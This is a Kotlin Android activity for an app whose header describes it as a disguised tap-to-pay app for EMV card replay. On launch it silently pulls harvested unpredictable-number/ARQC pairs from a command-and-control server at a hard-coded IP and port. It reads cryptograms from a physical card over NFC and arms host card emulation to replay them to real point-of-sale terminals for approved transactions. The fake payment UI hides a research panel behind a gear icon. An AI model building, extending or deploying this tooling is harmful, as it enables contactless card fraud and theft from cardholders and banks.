package xyz.nfc.moksha

import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.*
import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.IsoDep
import android.os.Bundle
import android.view.*
import android.view.animation.AccelerateDecelerateInterpolator
import android.view.animation.DecelerateInterpolator
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.*

/**
 * EMV UN Prover — App 2
 *
 * Looks like a real tap-to-pay app (Samsung Pay / Google Pay style).
 * On launch → silently syncs {UN→ARQC} pairs from C2 → arms HCE REPLAY mode.
 * Hold to a real POS → HceObserverService returns the pre-harvested ARQC.
 * Bank validates ARQC → APPROVED.
 *
 * Research panel: tap the ⚙ gear icon (top-right) or long-press anywhere on card.
 */
class MainActivity : AppCompatActivity() {

    private lateinit var db: ResearchDb
    private lateinit var nfcAdapter: NfcAdapter

    // Payment-UI refs
    private lateinit var statusText: TextView
    private lateinit var statusSub: TextView
    private lateinit var syncBadge: TextView
    private lateinit var overlayLayout: FrameLayout
    private lateinit var overlayIcon: TextView
    private lateinit var overlayText: TextView

    // Research panel refs
    private lateinit var researchPanel: LinearLayout
    private lateinit var researchLog: TextView

    // Ripple ring — fields updated by ValueAnimator and read by the custom View's onDraw
    private var rippleRadius = 0f
    private var rippleAlpha  = 0
    private var rippleView: View? = null

    private val sdf = SimpleDateFormat("HH:mm:ss", Locale.US)

    // ── Targeted harvest support ──────────────────────────────────────────
    private enum class Mode { OBSERVE, HARVEST }
    private var mode = Mode.OBSERVE
    private var pendingTargetUn: ByteArray? = null

    // ── HCE broadcast receiver ────────────────────────────────────────────
    private val hceReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            val unHex    = intent.getStringExtra(HceObserverService.EXTRA_UN_HEX) ?: return
            val isReplay = intent.getBooleanExtra(HceObserverService.EXTRA_REPLAY_HIT, false)
            db.insertObservedUn(
                unHex,
                intent.getLongExtra(HceObserverService.EXTRA_UN_INT, 0L),
                intent.getStringExtra(HceObserverService.EXTRA_AID) ?: "",
                intent.getLongExtra(HceObserverService.EXTRA_TIMESTAMP, System.currentTimeMillis())
            )
            runOnUiThread {
                if (isReplay) showApproved()
                else          showProcessing(unHex)
                logResearch("${sdf.format(Date())}  UN=$unHex  ${if (isReplay) "⚡ REPLAYED" else "👁 observed"}")
            }
        }
    }

    // ── Lifecycle ──────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        db = ResearchDb(this)
        nfcAdapter = NfcAdapter.getDefaultAdapter(this)
        buildPaymentUi()
        registerReceiver(
            hceReceiver,
            IntentFilter(HceObserverService.ACTION_UN_OBSERVED),
            Context.RECEIVER_NOT_EXPORTED
        )
        autoSyncFromC2()
    }

    override fun onResume() {
        super.onResume()
        val intent = Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
        val pi = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        nfcAdapter.enableForegroundDispatch(this, pi, null, null)
    }

    override fun onPause() {
        super.onPause()
        nfcAdapter.disableForegroundDispatch(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(hceReceiver)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        if (mode != Mode.HARVEST) return
        val tag     = intent.getParcelableExtra<Tag>(NfcAdapter.EXTRA_TAG) ?: return
        val isoDep  = IsoDep.get(tag) ?: return
        val un      = pendingTargetUn ?: return
        mode        = Mode.OBSERVE
        pendingTargetUn = null
        runHarvestCard(isoDep, un)
    }

    // ── Payment UI construction ───────────────────────────────────────────

    private fun buildPaymentUi() {
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
            View.SYSTEM_UI_FLAG_FULLSCREEN
        )

        val root = FrameLayout(this).apply {
            setBackgroundColor(Color.parseColor("#0A0E1A"))
        }

        // Background decorative rings
        root.addView(makeRingsView(), matchFill())

        // Ripple ring — onDraw reads rippleRadius/rippleAlpha from the outer class
        val rv = object : View(this@MainActivity) {
            override fun onDraw(c: Canvas) {
                if (rippleRadius <= 0f || rippleAlpha <= 0) return
                val cx = width / 2f; val cy = height * 0.42f
                val p = Paint(Paint.ANTI_ALIAS_FLAG).apply {
                    style       = Paint.Style.STROKE
                    strokeWidth = 4f
                    color       = Color.argb(rippleAlpha, 0x58, 0xA6, 0xFF)
                }
                c.drawCircle(cx, cy, rippleRadius, p)
            }
        }
        rippleView = rv
        root.addView(rv, matchFill())

        // Card view
        val cardView = makeCardView()
        val cardLp   = FrameLayout.LayoutParams(320.dp, 200.dp, Gravity.CENTER_HORIZONTAL)
        cardLp.topMargin = 120.dp
        root.addView(cardView, cardLp)
        startCardPulse(cardView)

        // Status block (below card)
        val statusBlock = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER
        }
        val statusLp = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT,
            Gravity.CENTER_HORIZONTAL
        ).also { it.topMargin = 360.dp }
        root.addView(statusBlock, statusLp)

        statusText = TextView(this).apply {
            text = "Ready to Pay"; setTextColor(Color.WHITE)
            textSize = 22f; gravity = Gravity.CENTER
            typeface = Typeface.DEFAULT_BOLD
        }
        statusBlock.addView(statusText)

        statusSub = TextView(this).apply {
            text = "Hold phone near payment terminal"
            setTextColor(Color.parseColor("#8B949E"))
            textSize = 13f; gravity = Gravity.CENTER
            setPadding(0, 8.dp, 0, 0)
        }
        statusBlock.addView(statusSub)

        syncBadge = TextView(this).apply {
            text = "Syncing…"
            setTextColor(Color.parseColor("#58A6FF"))
            textSize = 11f; gravity = Gravity.CENTER
            setPadding(0, 12.dp, 0, 0)
        }
        statusBlock.addView(syncBadge)

        // Approved / Declined overlay
        overlayLayout = FrameLayout(this).apply { visibility = View.GONE }
        root.addView(overlayLayout, matchFill())

        overlayLayout.addView(
            View(this).apply { setBackgroundColor(Color.parseColor("#CC000000")) },
            matchFill()
        )

        val overlayCenter = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER
        }
        overlayLayout.addView(overlayCenter,
            FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT,
                Gravity.CENTER
            ))

        overlayIcon = TextView(this).apply {
            text = "✓"; setTextColor(Color.parseColor("#33FF57"))
            textSize = 64f; gravity = Gravity.CENTER
        }
        overlayCenter.addView(overlayIcon)

        overlayText = TextView(this).apply {
            text = "Approved"; setTextColor(Color.WHITE)
            textSize = 28f; gravity = Gravity.CENTER
            typeface = Typeface.DEFAULT_BOLD
            setPadding(0, 16.dp, 0, 0)
        }
        overlayCenter.addView(overlayText)

        // Gear icon — top-right corner
        root.addView(
            TextView(this).apply {
                text = "⚙"; setTextColor(Color.parseColor("#3A4150"))
                textSize = 22f; setPadding(24, 48, 24, 24)
                setOnClickListener { toggleResearchPanel() }
                setOnLongClickListener { showResearchPanel(); true }
            },
            FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT,
                Gravity.TOP or Gravity.END
            )
        )

        // Research panel — hidden, slides up from bottom
        researchPanel = buildResearchPanel()
        root.addView(researchPanel,
            FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT,
                Gravity.BOTTOM
            ))

        setContentView(root)
    }

    private fun makeRingsView(): View = object : View(this) {
        override fun onDraw(c: Canvas) {
            val cx = width / 2f; val cy = height * 0.42f
            val p = Paint(Paint.ANTI_ALIAS_FLAG).apply {
                style = Paint.Style.STROKE; strokeWidth = 1f
                color = Color.parseColor("#1A2A4A")
            }
            listOf(180f, 260f, 340f, 420f).forEach { r -> c.drawCircle(cx, cy, r, p) }
        }
    }

    private fun makeCardView(): View = object : View(this) {
        override fun onDraw(c: Canvas) {
            val w = width.toFloat(); val h = height.toFloat()
            val p = Paint(Paint.ANTI_ALIAS_FLAG)

            // Body gradient — deep navy
            p.shader = LinearGradient(0f, 0f, w, h,
                Color.parseColor("#1A2E50"), Color.parseColor("#0D1B30"),
                Shader.TileMode.CLAMP)
            c.drawRoundRect(RectF(0f, 0f, w, h), 28f, 28f, p)
            p.shader = null

            // Shimmer band
            p.color = Color.parseColor("#0D3A6A")
            c.drawRect(RectF(0f, h * 0.55f, w, h * 0.72f), p)

            // EMV chip body
            p.color = Color.parseColor("#C8A900")
            c.drawRoundRect(RectF(36f, h * 0.28f, 94f, h * 0.64f), 8f, 8f, p)
            p.color = Color.parseColor("#A88800"); p.style = Paint.Style.STROKE; p.strokeWidth = 1.5f
            c.drawLine(65f, h * 0.28f, 65f, h * 0.64f, p)
            c.drawLine(36f, h * 0.46f, 94f, h * 0.46f, p)
            p.style = Paint.Style.FILL

            // NFC arcs
            p.color = Color.parseColor("#AABDD0"); p.style = Paint.Style.STROKE; p.strokeWidth = 2.5f
            val cx = 115f; val cy = h * 0.46f
            listOf(12f, 20f, 28f).forEach { r ->
                c.drawArc(RectF(cx - r, cy - r, cx + r, cy + r), -70f, 140f, false, p)
            }
            p.style = Paint.Style.FILL

            // VISA wordmark
            p.color = Color.WHITE; p.textSize = 34f; p.typeface = Typeface.DEFAULT_BOLD
            c.drawText("VISA", w - 110f, h - 26f, p)

            // Masked PAN
            p.typeface = Typeface.MONOSPACE; p.textSize = 17f
            p.color = Color.parseColor("#8BAAC0")
            c.drawText("●●●●  ●●●●  ●●●●  ----", 32f, h * 0.82f, p)

            // Bank label
            p.textSize = 11f; p.color = Color.parseColor("#4466AA")
            c.drawText("RESEARCH LAB CARD", 36f, 38f, p)
        }
    }

    private fun startCardPulse(view: View) {
        for (prop in listOf("scaleX", "scaleY")) {
            ObjectAnimator.ofFloat(view, prop, 1f, 1.015f, 1f).apply {
                duration     = 2400
                repeatCount  = ValueAnimator.INFINITE
                interpolator = AccelerateDecelerateInterpolator()
            }.start()
        }
    }

    // ── Research panel ────────────────────────────────────────────────────

    private fun buildResearchPanel(): LinearLayout {
        val panel = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#161B22"))
            visibility = View.GONE
            setPadding(20.dp, 20.dp, 20.dp, 40.dp)
        }

        panel.addView(TextView(this).apply {
            text = "⚙  Research Controls"
            setTextColor(Color.parseColor("#58A6FF"))
            textSize = 14f; typeface = Typeface.DEFAULT_BOLD
            setPadding(0, 0, 0, 12.dp)
        })

        panel.addView(panelBtn("📋  Pick session from C2") { showSessionPicker() })
        panel.addView(panelBtn("🔄  Sync replay queue (172.104.207.107:4444)") { syncFromC2(verbose = true) })
        panel.addView(panelBtn("⚡  Load local harvests") { loadLocalHarvests() })
        panel.addView(panelBtn("🔁  Toggle REPLAY / OBSERVE") {
            HceObserverService.replayMode = !HceObserverService.replayMode
            val label = if (HceObserverService.replayMode) "REPLAY ⚡" else "OBSERVE 👁"
            logResearch("Mode → $label")
            Toast.makeText(this, label, Toast.LENGTH_SHORT).show()
        })
        panel.addView(panelBtn("🎯  Arm targeted harvest (tap card)") { armHarvest() })
        panel.addView(panelBtn("✖  Close panel") { hideResearchPanel() })

        researchLog = TextView(this).apply {
            text = "Log:\n"
            setTextColor(Color.parseColor("#8B949E"))
            textSize = 10f; typeface = Typeface.MONOSPACE
            setBackgroundColor(Color.parseColor("#0D1117"))
            setPadding(12.dp, 12.dp, 12.dp, 12.dp)
            maxLines = 12
            val lp = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 220.dp)
            lp.topMargin = 8.dp; layoutParams = lp
        }
        panel.addView(researchLog)
        return panel
    }

    private fun toggleResearchPanel() {
        if (researchPanel.visibility == View.VISIBLE) hideResearchPanel() else showResearchPanel()
    }

    private fun showResearchPanel() {
        researchPanel.visibility = View.VISIBLE
        researchPanel.translationY = researchPanel.height.toFloat()
        researchPanel.animate()
            .translationY(0f).setDuration(280).setInterpolator(DecelerateInterpolator()).start()
    }

    private fun hideResearchPanel() {
        researchPanel.animate()
            .translationY(researchPanel.height.toFloat()).setDuration(240)
            .withEndAction { researchPanel.visibility = View.GONE }.start()
    }

    // ── Payment state transitions ─────────────────────────────────────────

    private fun showProcessing(unHex: String) {
        statusText.text = "Processing…"
        statusSub.text  = "UN: $unHex"
        animateRipple()
    }

    private fun showApproved() {
        overlayIcon.text = "✓"; overlayIcon.setTextColor(Color.parseColor("#33FF57"))
        overlayText.text = "Approved"; overlayText.setTextColor(Color.WHITE)
        showOverlay(3000)
        statusText.text = "Ready to Pay"
        statusSub.text  = "Hold phone near payment terminal"
    }

    @Suppress("unused")
    private fun showDeclined() {
        overlayIcon.text = "✗"; overlayIcon.setTextColor(Color.parseColor("#FF4444"))
        overlayText.text = "Declined"; overlayText.setTextColor(Color.parseColor("#FF4444"))
        showOverlay(2500)
        statusText.text = "Ready to Pay"
        statusSub.text  = "Hold phone near payment terminal"
    }

    private fun showOverlay(autoDismissMs: Long) {
        overlayLayout.visibility = View.VISIBLE
        overlayLayout.alpha = 0f
        overlayLayout.animate().alpha(1f).setDuration(200).start()
        overlayLayout.postDelayed({
            overlayLayout.animate().alpha(0f).setDuration(400)
                .withEndAction { overlayLayout.visibility = View.GONE }.start()
        }, autoDismissMs)
    }

    /** Ripple ring expanding from the card centre — updated via outer-class fields. */
    private fun animateRipple() {
        ValueAnimator.ofFloat(60f, 280f).apply {
            duration = 900
            addUpdateListener { va ->
                rippleRadius = va.animatedValue as Float
                rippleAlpha  = (255 * (1f - va.animatedFraction)).toInt().coerceIn(0, 255)
                rippleView?.invalidate()
            }
            addListener(object : android.animation.AnimatorListenerAdapter() {
                override fun onAnimationEnd(a: android.animation.Animator) {
                    rippleRadius = 0f; rippleAlpha = 0; rippleView?.invalidate()
                }
            })
        }.start()
    }

    // ── C2 sync ───────────────────────────────────────────────────────────

    private fun autoSyncFromC2() {
        lifecycleScope.launch {
            val records = withContext(Dispatchers.IO) { C2Client.fetchHarvests() }
            if (records.isNotEmpty()) {
                HceObserverService.loadCache(records)
                HceObserverService.replayMode = true
                syncBadge.text = "✅ ${records.size} ARQCs loaded  •  REPLAY armed"
                syncBadge.setTextColor(Color.parseColor("#33FF57"))
            } else {
                syncBadge.text = "⚠  C2 empty — tap card with Card Harvester first"
                syncBadge.setTextColor(Color.parseColor("#FFAA00"))
            }
        }
    }

    // ── Session picker ────────────────────────────────────────────────────

    private fun showSessionPicker() {
        logResearch("Fetching sessions from C2…")
        lifecycleScope.launch {
            val sessions = withContext(Dispatchers.IO) { C2Client.fetchSessions() }
            if (sessions.isEmpty()) {
                logResearch("❌ No sessions on C2. Tap a card with NFC Probe first.")
                Toast.makeText(this@MainActivity, "No sessions on C2", Toast.LENGTH_SHORT).show()
                return@launch
            }
            runOnUiThread { showSessionDialog(sessions) }
        }
    }

    private fun showSessionDialog(sessions: List<SessionData>) {
        val fmt = SimpleDateFormat("MMM d  HH:mm", Locale.US)
        val items = sessions.map { s ->
            val pan = if (s.pan.length >= 4) "●●●● ${s.pan.takeLast(4)}" else s.pan
            val ts  = fmt.format(Date(s.ts * 1000))
            "$pan   ${s.network.ifEmpty { "—" }}   ${s.sampleCount} samples   $ts"
        }.toTypedArray()

        AlertDialog.Builder(this)
            .setTitle("Select session to arm")
            .setItems(items) { _, i ->
                val s      = sessions[i]
                val remotes = s.transactions
                if (remotes.isEmpty()) {
                    logResearch("⚠  Session has no valid UN/ARQC pairs")
                    return@setItems
                }
                HceObserverService.loadCache(remotes)
                HceObserverService.replayMode = true
                val pan4 = if (s.pan.length >= 4) s.pan.takeLast(4) else s.pan
                syncBadge.text = "✅ ${remotes.size} ARQCs  ●●●● $pan4  •  REPLAY armed"
                syncBadge.setTextColor(Color.parseColor("#33FF57"))
                logResearch("✅ Session ●●●● $pan4 loaded — ${remotes.size} ARQCs in cache")
                remotes.take(3).forEach { r -> logResearch("  UN=${r.unHex}  AC=${r.arqcHex.take(16)}..") }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun syncFromC2(verbose: Boolean) {
        logResearch("Syncing from C2…")
        lifecycleScope.launch {
            val records = withContext(Dispatchers.IO) { C2Client.fetchHarvests() }
            if (records.isEmpty()) {
                logResearch("❌ No records. ADB tunnel up? Dashboard on :4444?")
                if (verbose) Toast.makeText(this@MainActivity, "C2 returned 0 records", Toast.LENGTH_SHORT).show()
            } else {
                HceObserverService.loadCache(records)
                HceObserverService.replayMode = true
                syncBadge.text = "✅ ${records.size} ARQCs loaded  •  REPLAY armed"
                syncBadge.setTextColor(Color.parseColor("#33FF57"))
                logResearch("✅ ${records.size} records loaded into REPLAY cache")
                records.take(5).forEach { r -> logResearch("  UN=${r.unHex}  ARQC=${r.arqcHex.take(16)}..") }
            }
        }
    }

    private fun loadLocalHarvests() {
        val harvests = db.getHarvests()
        if (harvests.isEmpty()) {
            logResearch("No local harvests. Arm targeted harvest and tap card.")
            return
        }
        val remotes = harvests.map { h ->
            RemoteHarvest(pan = h.pan, aid = h.aid, atcHex = h.atcHex, unHex = h.unHex, arqcHex = h.arqcHex)
        }
        HceObserverService.loadCache(remotes)
        HceObserverService.replayMode = true
        syncBadge.text = "✅ ${remotes.size} local ARQCs loaded  •  REPLAY armed"
        syncBadge.setTextColor(Color.parseColor("#33FF57"))
        logResearch("✅ ${remotes.size} local harvest(s) loaded into REPLAY cache")
        remotes.forEach { r -> logResearch("  UN=${r.unHex}  ARQC=${r.arqcHex.take(16)}..") }
    }

    // ── Targeted harvest ──────────────────────────────────────────────────

    private fun armHarvest() {
        pendingTargetUn = ByteArray(4).also { it[3] = 0x01 }
        mode = Mode.HARVEST
        logResearch("Armed. UN=${pendingTargetUn!!.toHex()}. Tap your card now.")
        Toast.makeText(this, "Tap your real card now", Toast.LENGTH_LONG).show()
    }

    private fun runHarvestCard(isoDep: IsoDep, un: ByteArray) {
        lifecycleScope.launch {
            try {
                isoDep.connect(); isoDep.timeout = 3000
                val result = withContext(Dispatchers.IO) {
                    val session = EmvSession(isoDep)
                    session.selectApp()
                    session.readRecords(session.getProcessingOptions())
                    session.generateAc(un)
                }
                isoDep.close()
                db.insertHarvest(HarvestRecord(
                    pan = result.pan, aid = result.aid.toHex(),
                    atcHex = result.atc.toHex(), atcDec = 0,
                    unHex = un.toHex(), arqcHex = result.arqc.toHex(),
                    timestamp = System.currentTimeMillis()
                ))
                logResearch("✅ Harvested UN=${un.toHex()} ARQC=${result.arqc.toHex()}")
                loadLocalHarvests()
            } catch (e: Exception) {
                logResearch("❌ Harvest error: ${e.message}")
            }
        }
    }

    // ── Layout / extension helpers ────────────────────────────────────────

    private fun panelBtn(label: String, onClick: () -> Unit) = Button(this).apply {
        text = label; textSize = 12f
        setBackgroundColor(Color.parseColor("#21262D"))
        setTextColor(Color.parseColor("#58A6FF"))
        val lp = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        ).also { it.setMargins(0, 4.dp, 0, 4.dp) }
        layoutParams = lp
        setOnClickListener { onClick() }
    }

    private fun matchFill() = FrameLayout.LayoutParams(
        ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT
    )

    private fun logResearch(msg: String) = runOnUiThread { researchLog.append("$msg\n") }

    private val Int.dp get() = (this * resources.displayMetrics.density).toInt()
    private fun ByteArray.toHex() = joinToString("") { "%02X".format(it) }
}
